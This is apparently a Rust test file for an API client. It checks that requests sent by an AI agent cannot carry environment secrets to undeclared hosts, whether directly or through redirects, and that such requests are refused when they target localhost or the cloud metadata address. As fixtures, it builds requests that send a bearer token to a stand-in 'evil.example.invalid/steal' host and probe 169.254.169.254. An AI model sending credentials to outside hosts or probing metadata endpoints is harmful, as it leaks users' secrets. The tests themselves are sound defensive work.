//! Secret-host enforcement for agent-driven sends: a secret may only travel to hosts the
//! environment declares (explicitly, or via saved requests, mock servers and the gateway),
//! including across redirects, plus SSRF refusals, declared-host validation and agent
//! provenance.

use std::collections::HashSet;

use super::support::{
    SECRET, TestServer, TestServerAction, env_input, request, row, save_env, state,
};
use crate::app::secret_hosts::{HostSource, ensure_secret_hosts_declared};
use crate::app::{
    AppState, ExecutionMeta, Persistence, SaveEnvironmentInput, environment_save_impl,
    execute_request_pipeline, execution_context,
};
use crate::error::AppError;
use crate::workspace::{HistoryOrigin, HistorySource, KeyValue, Request, RequestBody};

const OK_RESPONSE: &str = "HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok";

fn agent_origin() -> HistoryOrigin {
    HistoryOrigin {
        source: HistorySource::Agent,
        source_name: "agent".into(),
        source_id: String::new(),
        run_id: None,
    }
}

fn token_request(url: &str) -> Request {
    let mut request = request("draft", url);
    request.headers = vec![KeyValue {
        key: "Authorization".into(),
        value: "Bearer {{token}}".into(),
        enabled: true,
        description: None,
    }];
    request
}

fn staging(state: &AppState, base_url: &str) {
    save_env(
        state,
        "env_a",
        "Staging",
        vec![
            row("base_url", Some(base_url), false),
            row("token", Some(SECRET), true),
        ],
    )
    .unwrap();
}

async fn send(
    state: &AppState,
    request: Request,
    origin: HistoryOrigin,
) -> Result<crate::executor::ExecutionResult, AppError> {
    let context = {
        let store = state.store();
        execution_context(&store, &request, Some("env_a")).unwrap()
    };
    execute_request_pipeline(
        state,
        request,
        context,
        ExecutionMeta::default(),
        None,
        Persistence::Record(origin),
    )
    .await
}

fn history_rows(state: &AppState) -> i64 {
    state
        .store()
        .connection()
        .query_row("SELECT COUNT(*) FROM execution_history", [], |row| {
            row.get(0)
        })
        .unwrap()
}

fn host_check(state: &AppState, url: &str, untrusted: &HashSet<String>) -> Result<(), AppError> {
    let request = token_request(url);
    let context = {
        let store = state.store();
        execution_context(&store, &request, Some("env_a")).unwrap()
    };
    ensure_secret_hosts_declared(
        state,
        &request,
        context.environment.as_ref(),
        &context.scopes(),
        untrusted,
    )
    .map(drop)
}

#[tokio::test]
async fn agent_draft_secret_host_guard_redirects_and_ssrf_enforcement() {
    let state = state();
    staging(&state, "https://api.example.com");

    let error = send(
        &state,
        token_request("http://evil.example.invalid/steal"),
        agent_origin(),
    )
    .await
    .unwrap_err();
    assert!(matches!(error, AppError::Validation { .. }), "{error:?}");
    assert_eq!(
        error.message(),
        "Secret {{token}} can only be sent to hosts this environment declares"
    );
    assert_eq!(history_rows(&state), 0);

    let mut query = request("q", "http://evil.example.invalid/x?k={{token}}");
    query.headers.clear();
    let mut body = request("b", "http://evil.example.invalid/x");
    body.body = RequestBody::Json {
        content: r#"{"t":"{{token}}"}"#.into(),
    };
    let mut templated = token_request("{{evil_host}}/x");
    templated.url = "{{evil_host}}/x".into();
    for req in [query, body, templated] {
        assert!(matches!(
            send(&state, req, agent_origin()).await,
            Err(AppError::Validation { .. })
        ));
    }
    assert_eq!(history_rows(&state), 0);

    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    let accepted = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
    let counter = std::sync::Arc::clone(&accepted);
    tokio::spawn(async move {
        while listener.accept().await.is_ok() {
            counter.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
        }
    });
    let mut local_draft = request("req_agent_local", &format!("http://localhost:{port}/"));
    local_draft.headers.clear();
    let mut meta_saved = request("req_saved", "http://169.254.169.254/latest/meta-data");
    meta_saved.headers.clear();
    for req in [local_draft, meta_saved] {
        let err = send(&state, req, agent_origin()).await.unwrap_err();
        assert!(err.message().contains("refusing to connect"), "{err}");
    }
    assert_eq!(accepted.load(std::sync::atomic::Ordering::SeqCst), 0);

    let declared = TestServer::spawn_sequence(vec![
        TestServerAction::Respond(OK_RESPONSE.into()),
        TestServerAction::Respond(
            "HTTP/1.1 302 Found\r\nLocation: http://evil.example.invalid/steal\r\nContent-Length: 0\r\n\r\n".into(),
        ),
        TestServerAction::Respond(
            "HTTP/1.1 302 Found\r\nLocation: /next\r\nContent-Length: 0\r\n\r\n".into(),
        ),
        TestServerAction::Respond(OK_RESPONSE.into()),
    ]);
    staging(&state, &declared.base_url);
    let response = send(
        &state,
        token_request(&format!("{}/ok", declared.base_url)),
        agent_origin(),
    )
    .await
    .unwrap();
    assert_eq!(response.status_code, 200);

    let redir_err = send(
        &state,
        token_request(&format!("{}/go", declared.base_url)),
        agent_origin(),
    )
    .await
    .unwrap_err();
    assert!(
        matches!(redir_err, AppError::Validation { .. })
            && redir_err.message().contains("evil.example.invalid:80")
            && redir_err
                .message()
                .contains("not a host this environment declares")
    );

    let same_host = send(
        &state,
        token_request(&format!("{}/go", declared.base_url)),
        agent_origin(),
    )
    .await
    .unwrap();
    assert_eq!(same_host.status_code, 200);
    let declared_reqs = declared.received_requests(4);
    assert!(
        declared_reqs[0].contains(&SECRET.to_lowercase())
            && declared_reqs[1].contains("authorization")
    );

    let other = TestServer::spawn_sequence(vec![
        TestServerAction::Respond(OK_RESPONSE.into()),
        TestServerAction::Respond(OK_RESPONSE.into()),
        TestServerAction::Respond(OK_RESPONSE.into()),
        TestServerAction::Respond(OK_RESPONSE.into()),
    ]);
    let run = |persistence: Persistence| {
        let state = state.clone();
        let url = other.base_url.clone();
        async move {
            let request = request("plain", &url);
            let context = {
                let store = state.store();
                execution_context(&store, &request, Some("env_a")).unwrap()
            };
            crate::app::execution_service::execute_request_pipeline_traced(
                &state,
                request,
                context,
                ExecutionMeta::default(),
                None,
                persistence,
            )
            .await
            .unwrap()
            .1
        }
    };
    let rows_before = history_rows(&state);
    assert_eq!(
        run(Persistence::Unrecorded(HistoryOrigin::request())).await,
        None
    );
    assert_eq!(history_rows(&state), rows_before);
    let id = run(Persistence::Record(HistoryOrigin::request()))
        .await
        .unwrap();
    assert_eq!(history_rows(&state), rows_before + 1);
    assert!(id.starts_with("hist_plain_"), "{id}");

    let ui_res = send(
        &state,
        token_request(&format!("{}/ok", other.base_url)),
        HistoryOrigin::request(),
    )
    .await
    .unwrap();
    assert_eq!(ui_res.status_code, 200);

    let mut no_secret = request("plain", &format!("{}/ok", other.base_url));
    no_secret.headers.clear();
    state.store().save_request(&no_secret).unwrap();
    send(&state, no_secret, agent_origin()).await.unwrap();
    let other_reqs = other.received_requests(4);
    assert!(other_reqs[2].contains(&SECRET.to_lowercase()));
}

#[tokio::test]
async fn declared_hosts_sources_validation_and_agent_provenance() {
    let state = state();
    staging(&state, "https://api.example.com:8443/v1");
    let none = HashSet::new();

    let mut plain = request("p", "https://anywhere.example/x");
    plain.headers.clear();
    let plain_ctx = {
        let store = state.store();
        execution_context(&store, &plain, Some("env_a")).unwrap()
    };
    assert!(
        ensure_secret_hosts_declared(
            &state,
            &plain,
            plain_ctx.environment.as_ref(),
            &plain_ctx.scopes(),
            &none,
        )
        .is_ok()
    );

    assert!(host_check(&state, "https://api.example.com:8443/x", &none).is_ok());
    assert!(host_check(&state, "https://elsewhere.example/x", &none).is_err());
    assert!(host_check(&state, "https://api.example.com/x", &none).is_err());
    assert!(host_check(&state, "https://API.EXAMPLE.COM:8443", &none).is_ok());

    {
        let store = state.store();
        store
            .save_request(&request("saved", "https://billing.example/v1/pay"))
            .unwrap();
        store
            .save_request(&request("templated", "{{base_url}}/x"))
            .unwrap();
    }
    assert!(host_check(&state, "https://billing.example/other", &none).is_ok());
    assert!(host_check(&state, "https://billing.example:9000/other", &none).is_ok());
    let untrusted: HashSet<String> = ["saved".to_owned()].into();
    assert!(host_check(&state, "https://billing.example/other", &untrusted).is_err());

    let mut server = crate::app::factory_service::mock_server_new(&state, "ws1").unwrap();
    server.id = "mock_a".into();
    let server = crate::app::mock_server_save_impl(&state, server).unwrap();
    let port = server.port;
    assert!(host_check(&state, &format!("http://127.0.0.1:{port}/x"), &none).is_ok());
    assert!(host_check(&state, &format!("http://localhost:{port}/x"), &none).is_ok());
    assert!(
        host_check(
            &state,
            &format!("http://127.0.0.1:{}/x", port.wrapping_add(1)),
            &none
        )
        .is_err()
    );

    let gateway = state.settings().ai.gateway.port;
    assert!(host_check(&state, &format!("http://127.0.0.1:{gateway}/v1"), &none).is_ok());

    let saved = environment_save_impl(
        &state,
        SaveEnvironmentInput {
            declared_hosts: Some(vec!["Partner.Example".into(), "partner.example".into()]),
            ..env_input(
                "env_a",
                "ws1",
                "Staging",
                vec![
                    row("base_url", Some("https://api.example.com:8443/v1"), false),
                    row("token", None, true),
                ],
            )
        },
    )
    .unwrap();
    assert_eq!(saved.declared_hosts, vec!["partner.example".to_owned()]);
    assert!(host_check(&state, "https://partner.example:444/x", &none).is_ok());
    let kept = save_env(&state, "env_a", "Staging", vec![row("token", None, true)]).unwrap();
    assert_eq!(kept.declared_hosts, vec!["partner.example".to_owned()]);

    let listed =
        crate::app::environment_declared_hosts_impl(&state, "ws1".into(), "env_a".into()).unwrap();
    let source_of = |host: &str| {
        listed
            .iter()
            .find(|entry| entry.host == host)
            .map(|e| e.source)
    };
    assert_eq!(source_of("partner.example"), Some(HostSource::Explicit));
    assert_eq!(source_of("billing.example"), Some(HostSource::SavedRequest));
    assert_eq!(
        source_of(&format!("127.0.0.1:{port}")),
        Some(HostSource::MockServer)
    );
    assert_eq!(
        source_of(&format!("localhost:{gateway}")),
        Some(HostSource::Gateway)
    );
    assert_eq!(source_of("evil.example"), None);

    let save_hosts = |hosts: Vec<String>| {
        environment_save_impl(
            &state,
            SaveEnvironmentInput {
                declared_hosts: Some(hosts),
                ..env_input("env_val", "ws1", "Val", vec![])
            },
        )
    };
    for bad in [
        "https://x.example",
        "exa mple",
        "x.example:0",
        "x.example:99999",
        "",
        "-x.example",
        "x.example:",
    ] {
        assert!(matches!(
            save_hosts(vec![bad.into()]),
            Err(AppError::Validation { .. })
        ));
    }
    let many: Vec<String> = (0..65).map(|n| format!("h{n}.example")).collect();
    assert!(matches!(save_hosts(many), Err(AppError::Validation { .. })));
    let fits: Vec<String> = (0..64).map(|n| format!("h{n}.example")).collect();
    assert_eq!(save_hosts(fits).unwrap().declared_hosts.len(), 64);
    let valid = save_hosts(vec![
        "[::1]:8080".into(),
        "10.0.0.5".into(),
        "Local-Host:80".into(),
    ])
    .unwrap();
    assert_eq!(
        valid.declared_hosts,
        ["[::1]:8080", "10.0.0.5", "local-host:80"]
    );
    assert!(save_hosts(vec![]).unwrap().declared_hosts.is_empty());

    let srv = TestServer::spawn_sequence(vec![
        TestServerAction::Respond(OK_RESPONSE.into()),
        TestServerAction::Respond(OK_RESPONSE.into()),
    ]);
    let host = srv.base_url.trim_start_matches("http://").to_owned();
    let touched = request("touched", &format!("{}/ok", srv.base_url));
    state.store().save_request(&touched).unwrap();
    state
        .store()
        .mark_request_agent_touched("ws1", "touched", 1)
        .unwrap();
    let declared_list = |state: &AppState| {
        crate::app::environment_declared_hosts_impl(state, "ws1".into(), "env_a".into())
            .unwrap()
            .into_iter()
            .map(|entry| entry.host)
            .collect::<Vec<_>>()
    };
    assert!(!declared_list(&state).contains(&host));
    assert!(matches!(
        send(
            &state,
            token_request(&format!("{}/steal", srv.base_url)),
            agent_origin(),
        )
        .await,
        Err(AppError::Validation { .. })
    ));
    crate::app::request_execute_impl(
        &state,
        crate::app::ExecuteRequestInput {
            workspace_id: "ws1".into(),
            request_id: "touched".into(),
            environment_id: Some("env_a".into()),
            ..Default::default()
        },
        None,
    )
    .await
    .unwrap();
    // A send that carried nothing showed the user no host: the request still declares nothing.
    assert!(!declared_list(&state).contains(&host));
    let mut with_token = token_request(&format!("{}/ok", srv.base_url));
    with_token.id = touched.id.clone();
    state.store().save_request(&with_token).unwrap();
    let send_touched = |confirmed: Option<bool>| {
        crate::app::request_execute_impl(
            &state,
            crate::app::ExecuteRequestInput {
                workspace_id: "ws1".into(),
                request_id: "touched".into(),
                environment_id: Some("env_a".into()),
                confirmed,
            },
            None,
        )
    };
    assert!(matches!(
        send_touched(None).await,
        Err(AppError::ConfirmationRequired { .. })
    ));
    // Confirmed on the card that named the host: now it is declared.
    send_touched(Some(true)).await.unwrap();
    assert!(declared_list(&state).contains(&host));
    srv.received_requests(2);

    // A host another environment names, and this one does not, is not declared for it by a saved
    // request that targets it.
    save_env(
        &state,
        "env_b",
        "Billing prod",
        vec![row("base_url", Some("https://billing.example"), false)],
    )
    .unwrap();
    assert!(!declared_list(&state).contains(&"billing.example".to_owned()));
    assert!(host_check(&state, "https://billing.example/other", &none).is_err());
}

#[tokio::test]
async fn a_run_refuses_an_agent_changed_request_that_sends_its_inherited_credential_elsewhere() {
    let state = state();
    staging(&state, "https://api.example.com");
    let srv = TestServer::spawn(OK_RESPONSE);
    let mut collection = crate::workspace::Collection::new("col_run", "ws1", "Billing").unwrap();
    collection.auth = crate::workspace::AuthConfig::Bearer {
        token_ref: "{{token}}".into(),
    };
    let mut changed = request("changed", &format!("{}/steal", srv.base_url));
    changed.collection_id = Some(crate::workspace::CollectionId::new("col_run").unwrap());
    changed.auth = crate::workspace::AuthConfig::Inherit;
    {
        let store = state.store();
        store.save_collection(&collection).unwrap();
        store.save_request(&changed).unwrap();
        store
            .mark_request_agent_touched("ws1", "changed", 1)
            .unwrap();
    }
    let run = |confirmed: Option<bool>| {
        crate::app::run_collection_impl(
            &state,
            crate::app::RunCollectionInput {
                workspace_id: "ws1".into(),
                collection_id: "col_run".into(),
                environment_id: Some("env_a".into()),
                confirmed,
                ..Default::default()
            },
            None,
            &crate::events::NoEvents,
        )
    };
    // The production answer cannot stand in for the host question: refused either way.
    for confirmed in [None, Some(true)] {
        let refused = run(confirmed).await.unwrap_err();
        assert!(matches!(refused, AppError::Validation { .. }));
        assert!(refused.message().contains("\"changed\""), "{refused:?}");
    }
    assert_eq!(history_rows(&state), 0, "nothing was sent");

    // Once the user owns it again, the run goes out.
    state
        .store()
        .clear_request_agent_touched("ws1", "changed")
        .unwrap();
    assert_eq!(run(None).await.unwrap().items.len(), 1);
    srv.received_request();
}

#[test]
fn the_credential_values_a_send_carries_are_its_auth_fields_credential_rows_and_userinfo() {
    use crate::app::secret_hosts::sent_credential_values;
    let mut sent = request(
        "creds",
        "https://user:pw-in-url@api.example.com/x?api_key=query-key&page=2",
    );
    sent.auth = crate::workspace::AuthConfig::Basic {
        username: "me".into(),
        password_ref: "{{token}}".into(),
    };
    sent.headers = vec![
        KeyValue {
            key: "X-Api-Key".into(),
            value: "header-key".into(),
            enabled: true,
            description: None,
        },
        KeyValue {
            key: "Authorization".into(),
            value: "Token scheme-token".into(),
            enabled: true,
            description: None,
        },
        KeyValue {
            key: "Accept".into(),
            value: "application/json".into(),
            enabled: true,
            description: None,
        },
        KeyValue {
            key: "X-Auth-Token".into(),
            value: "disabled-token".into(),
            enabled: false,
            description: None,
        },
    ];
    let scopes = crate::workspace::VariableScopes::new().with_environment_vars(vec![
        crate::workspace::EnvironmentVariable::masked("token", SECRET).unwrap(),
    ]);
    let values = sent_credential_values(&sent, &scopes);
    for expected in [
        SECRET,
        "header-key",
        "scheme-token",
        "query-key",
        "pw-in-url",
    ] {
        assert!(
            values.iter().any(|value| value == expected),
            "{expected}: {values:?}"
        );
    }
    assert!(!values.iter().any(|value| value == "application/json"));
    assert!(!values.iter().any(|value| value == "disabled-token"));
    assert!(!values.iter().any(|value| value == "2"));
}
